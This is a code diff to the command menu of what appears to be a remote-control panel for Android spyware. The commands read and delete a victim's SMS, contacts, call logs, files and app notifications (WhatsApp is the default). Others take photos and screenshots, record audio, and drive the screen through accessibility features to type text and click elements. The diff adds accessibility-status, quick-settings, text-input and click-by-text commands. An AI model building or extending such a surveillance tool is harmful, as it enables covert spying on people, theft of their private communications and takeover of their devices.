@@ -6,12 +6,14 @@ const COMMANDS = {
     label: 'System',
     icon: '💻',
     cmds: [
-      { id: 'ping',            icon: '📡', label: 'Ping' },
-      { id: 'get_device_info', icon: 'ℹ️',  label: 'Device Info' },
-      { id: 'get_battery_info',icon: '🔋', label: 'Battery' },
-      { id: 'get_network_info',icon: '🌐', label: 'Network' },
-      { id: 'get_wifi_networks',icon: '📶', label: 'WiFi Nets' },
-      { id: 'get_system_info', icon: '🖥️', label: 'System Info' },
+      { id: 'ping',                    icon: '📡', label: 'Ping' },
+      { id: 'get_accessibility_status',icon: '♿', label: 'Accessibility?' },
+      { id: 'get_device_info',         icon: 'ℹ️',  label: 'Device Info' },
+      { id: 'get_battery_info',        icon: '🔋', label: 'Battery' },
+      { id: 'get_network_info',        icon: '🌐', label: 'Network' },
+      { id: 'get_wifi_networks',       icon: '📶', label: 'WiFi Nets' },
+      { id: 'get_system_info',         icon: '🖥️', label: 'System Info' },
+      { id: 'get_installed_apps',      icon: '📦', label: 'Installed Apps' },
     ]
   },
   location: {
@@ -25,38 +27,37 @@ const COMMANDS = {
     label: 'Device',
     icon: '📳',
     cmds: [
-      { id: 'vibrate',         icon: '📳', label: 'Vibrate',     params: [{ key: 'duration', label: 'Duration (ms)', default: '500' }] },
-      { id: 'play_sound',      icon: '🔊', label: 'Play Sound' },
-      { id: 'get_clipboard',   icon: '📋', label: 'Get Clipboard' },
-      { id: 'set_clipboard',   icon: '📋', label: 'Set Clipboard', params: [{ key: 'text', label: 'Text to set', default: '' }] },
-      { id: 'get_installed_apps', icon: '📦', label: 'Installed Apps' },
+      { id: 'vibrate',       icon: '📳', label: 'Vibrate',       params: [{ key: 'duration', label: 'Duration (ms)', default: '500' }] },
+      { id: 'play_sound',    icon: '🔊', label: 'Play Sound' },
+      { id: 'get_clipboard', icon: '📋', label: 'Get Clipboard' },
+      { id: 'set_clipboard', icon: '📋', label: 'Set Clipboard', params: [{ key: 'text', label: 'Text to set', default: '' }] },
     ]
   },
   sms: {
     label: 'SMS',
     icon: '💬',
     cmds: [
-      { id: 'get_all_sms',     icon: '💬', label: 'All SMS',      params: [{ key: 'limit', label: 'Limit', default: '100' }] },
-      { id: 'get_sms_from_number', icon: '💬', label: 'SMS From #', params: [{ key: 'phoneNumber', label: 'Phone Number', default: '' }, { key: 'limit', label: 'Limit', default: '50' }] },
-      { id: 'send_sms',        icon: '📤', label: 'Send SMS',     params: [{ key: 'phoneNumber', label: 'Phone Number', default: '' }, { key: 'message', label: 'Message', default: '' }] },
-      { id: 'delete_sms',      icon: '🗑️', label: 'Delete SMS',   params: [{ key: 'smsId', label: 'SMS ID', default: '' }] },
+      { id: 'get_all_sms',         icon: '💬', label: 'All SMS',     params: [{ key: 'limit', label: 'Limit', default: '100' }] },
+      { id: 'get_sms_from_number', icon: '💬', label: 'SMS From #',  params: [{ key: 'phoneNumber', label: 'Phone Number', default: '' }, { key: 'limit', label: 'Limit', default: '50' }] },
+      { id: 'send_sms',            icon: '📤', label: 'Send SMS',    params: [{ key: 'phoneNumber', label: 'Phone Number', default: '' }, { key: 'message', label: 'Message', default: '' }] },
+      { id: 'delete_sms',          icon: '🗑️', label: 'Delete SMS',  params: [{ key: 'smsId', label: 'SMS ID', default: '' }] },
     ]
   },
   contacts: {
     label: 'Contacts',
     icon: '👥',
     cmds: [
-      { id: 'get_all_contacts', icon: '👥', label: 'All Contacts' },
-      { id: 'search_contacts',  icon: '🔍', label: 'Search Contacts', params: [{ key: 'query', label: 'Search Query', default: '' }] },
+      { id: 'get_all_contacts',  icon: '👥', label: 'All Contacts' },
+      { id: 'search_contacts',   icon: '🔍', label: 'Search',       params: [{ key: 'query', label: 'Search Query', default: '' }] },
     ]
   },
   calls: {
     label: 'Calls',
     icon: '📞',
     cmds: [
-      { id: 'get_all_call_logs',    icon: '📞', label: 'All Calls',    params: [{ key: 'limit', label: 'Limit', default: '100' }] },
-      { id: 'get_call_statistics',  icon: '📊', label: 'Call Stats' },
-      { id: 'get_call_logs_by_type',icon: '📞', label: 'Calls By Type', params: [{ key: 'callType', label: 'Type (1=in,2=out,3=missed)', default: '1' }, { key: 'limit', label: 'Limit', default: '50' }] },
+      { id: 'get_all_call_logs',     icon: '📞', label: 'All Calls',    params: [{ key: 'limit', label: 'Limit', default: '100' }] },
+      { id: 'get_call_statistics',   icon: '📊', label: 'Call Stats' },
+      { id: 'get_call_logs_by_type', icon: '📞', label: 'By Type',      params: [{ key: 'callType', label: 'Type (1=in, 2=out, 3=missed)', default: '1' }, { key: 'limit', label: 'Limit', default: '50' }] },
     ]
   },
   camera: {
@@ -64,18 +65,18 @@ const COMMANDS = {
     icon: '📷',
     cmds: [
       { id: 'get_available_cameras', icon: '📷', label: 'List Cameras' },
-      { id: 'take_photo', icon: '📸', label: 'Take Photo', params: [{ key: 'cameraId', label: 'Camera ID (0=back,1=front)', default: '0' }, { key: 'quality', label: 'Quality (low/mid/high)', default: 'high' }] },
-      { id: 'take_screenshot', icon: '🖼️', label: 'Screenshot' },
+      { id: 'take_photo',            icon: '📸', label: 'Take Photo',   params: [{ key: 'cameraId', label: 'Camera ID (0=back, 1=front)', default: '0' }, { key: 'quality', label: 'Quality (low/mid/high)', default: 'high' }] },
+      { id: 'take_screenshot',       icon: '🖼️', label: 'Screenshot' },
     ]
   },
   audio: {
     label: 'Audio',
     icon: '🎤',
     cmds: [
-      { id: 'start_recording', icon: '🎤', label: 'Start Rec',    params: [{ key: 'filename', label: 'Filename (optional)', default: '' }] },
-      { id: 'stop_recording',  icon: '⏹️', label: 'Stop Rec' },
+      { id: 'start_recording',      icon: '🎤', label: 'Start Rec',  params: [{ key: 'filename', label: 'Filename (optional)', default: '' }] },
+      { id: 'stop_recording',       icon: '⏹️', label: 'Stop Rec' },
       { id: 'get_recording_status', icon: '🎙️', label: 'Rec Status' },
-      { id: 'list_recordings', icon: '🎵', label: 'List Recs' },
+      { id: 'list_recordings',      icon: '🎵', label: 'List Recs' },
     ]
   },
   files: {
@@ -84,7 +85,7 @@ const COMMANDS = {
     cmds: [
       { id: 'list_files',       icon: '📁', label: 'List Files',  params: [{ key: 'path', label: 'Path (blank = root)', default: '' }] },
       { id: 'read_file',        icon: '📄', label: 'Read File',   params: [{ key: 'filePath', label: 'File Path', default: '' }, { key: 'asBase64', label: 'As Base64 (true/false)', default: 'false' }] },
-      { id: 'search_files',     icon: '🔍', label: 'Search Files', params: [{ key: 'directory', label: 'Directory', default: '/sdcard' }, { key: 'query', label: 'Search Query', default: '' }] },
+      { id: 'search_files',     icon: '🔍', label: 'Search Files',params: [{ key: 'directory', label: 'Directory', default: '/sdcard' }, { key: 'query', label: 'Query', default: '' }] },
       { id: 'get_file_info',    icon: '📄', label: 'File Info',   params: [{ key: 'filePath', label: 'File Path', default: '' }] },
       { id: 'delete_file',      icon: '🗑️', label: 'Delete File', params: [{ key: 'filePath', label: 'File Path', default: '' }] },
     ]
@@ -101,34 +102,59 @@ const COMMANDS = {
     label: 'Notifs',
     icon: '🔔',
     cmds: [
-      { id: 'get_notifications',        icon: '🔔', label: 'Get Notifs' },
-      { id: 'get_notifications_from_app', icon: '🔔', label: 'Notifs By App', params: [{ key: 'packageName', label: 'Package Name', default: 'com.whatsapp' }] },
-      { id: 'clear_notifications',      icon: '🧹', label: 'Clear Notifs' },
+      { id: 'get_notifications',           icon: '🔔', label: 'All Notifs' },
+      { id: 'get_notifications_from_app',  icon: '🔔', label: 'By App',      params: [{ key: 'packageName', label: 'Package Name', default: 'com.whatsapp' }] },
+      { id: 'clear_notifications',         icon: '🧹', label: 'Clear Notifs' },
     ]
   },
   screen_ctrl: {
     label: 'Screen Ctrl',
     icon: '👆',
     cmds: [
-      { id: 'press_home',    icon: '🏠', label: 'Home' },
-      { id: 'press_back',    icon: '◀️', label: 'Back' },
-      { id: 'press_recents', icon: '⬜', label: 'Recents' },
+      { id: 'press_home',         icon: '🏠', label: 'Home' },
+      { id: 'press_back',         icon: '◀️', label: 'Back' },
+      { id: 'press_recents',      icon: '⬜', label: 'Recents' },
       { id: 'open_notifications', icon: '🔔', label: 'Open Notifs' },
-      { id: 'scroll_up',     icon: '⬆️', label: 'Scroll Up' },
-      { id: 'scroll_down',   icon: '⬇️', label: 'Scroll Down' },
-      { id: 'touch', icon: '👆', label: 'Touch', params: [{ key: 'x', label: 'X', default: '540' }, { key: 'y', label: 'Y', default: '960' }, { key: 'duration', label: 'Duration ms', default: '100' }] },
-      { id: 'swipe', icon: '👆', label: 'Swipe',  params: [{ key: 'startX', label: 'Start X', default: '540' }, { key: 'startY', label: 'Start Y', default: '1200' }, { key: 'endX', label: 'End X', default: '540' }, { key: 'endY', label: 'End Y', default: '400' }, { key: 'duration', label: 'Duration ms', default: '300' }] },
+      { id: 'open_quick_settings',icon: '⚙️', label: 'Quick Settings' },
+      { id: 'scroll_up',          icon: '⬆️', label: 'Scroll Up' },
+      { id: 'scroll_down',        icon: '⬇️', label: 'Scroll Down' },
+      {
+        id: 'touch', icon: '👆', label: 'Touch',
+        params: [
+          { key: 'x',        label: 'X',           default: '540' },
+          { key: 'y',        label: 'Y',           default: '960' },
+          { key: 'duration', label: 'Duration (ms)',default: '100' },
+        ]
+      },
+      {
+        id: 'swipe', icon: '↔️', label: 'Swipe',
+        params: [
+          { key: 'startX',   label: 'Start X',     default: '540' },
+          { key: 'startY',   label: 'Start Y',     default: '1200' },
+          { key: 'endX',     label: 'End X',       default: '540' },
+          { key: 'endY',     label: 'End Y',       default: '400' },
+          { key: 'duration', label: 'Duration (ms)',default: '300' },
+        ]
+      },
+      {
+        id: 'input_text', icon: '✏️', label: 'Type Text',
+        params: [{ key: 'text', label: 'Text to type', default: '' }]
+      },
+      {
+        id: 'click_by_text', icon: '🔍', label: 'Click By Text',
+        params: [{ key: 'text', label: 'Element text', default: '' }]
+      },
     ]
   },
   screen_reader: {
     label: 'Screen Read',
     icon: '📺',
     cmds: [
-      { id: 'read_screen',            icon: '📺', label: 'Read Screen' },
-      { id: 'get_current_app',        icon: '📱', label: 'Current App' },
-      { id: 'get_clickable_elements', icon: '👆', label: 'Clickable Els' },
-      { id: 'get_input_fields',       icon: '✏️', label: 'Input Fields' },
-      { id: 'find_by_text',           icon: '🔍', label: 'Find By Text', params: [{ key: 'text', label: 'Text to find', default: '' }] },
+      { id: 'read_screen',             icon: '📺', label: 'Read Screen' },
+      { id: 'get_current_app',         icon: '📱', label: 'Current App' },
+      { id: 'get_clickable_elements',  icon: '👆', label: 'Clickable Els' },
+      { id: 'get_input_fields',        icon: '✏️', label: 'Input Fields' },
+      { id: 'find_by_text',            icon: '🔍', label: 'Find By Text', params: [{ key: 'text', label: 'Text to find', default: '' }] },
     ]
   }
 };
